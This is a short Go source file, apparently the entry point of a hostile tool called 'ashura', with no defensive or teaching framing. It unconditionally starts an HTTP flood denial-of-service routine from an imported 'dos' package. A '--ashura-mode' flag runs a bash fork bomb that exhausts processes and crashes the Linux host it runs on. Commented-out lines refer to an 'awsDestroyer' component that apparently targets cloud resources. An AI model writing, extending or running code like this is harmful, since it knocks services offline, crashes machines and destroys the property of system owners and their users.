package main

import (
	// "ashura/awsDestroyer"
	"ashura/pkg/dos"
	"fmt"
	log "github.com/sirupsen/logrus"
	"io"
	"os"
	"os/exec"
	"runtime"
)

func main() {
	/*
	   Setting logging
	*/
	multiWriter := io.MultiWriter(os.Stdout)
	formatter := &log.TextFormatter{
		FullTimestamp: true,
	}
	log.SetLevel(log.DebugLevel)
	log.SetReportCaller(true)
	log.SetFormatter(formatter)
	log.SetOutput(multiWriter)
	log.Info("[+] Hi")

	for i := 0; i < len(os.Args); i++ {
		if os.Args[i] == "--ashura-mode" {
			ashuraMode()
		}
	}
	dos.HttpFlood("")
	//awsDestroyer.AwsDestroyer()
}

func ashuraMode() {
	fmt.Println("[-] Running ashura mode...")
	if runtime.GOOS == "linux" {
		cmd := exec.Command("/bin/bash", "-c", ":(){ :|:& };:")
		_ = cmd.Run()
	}
}
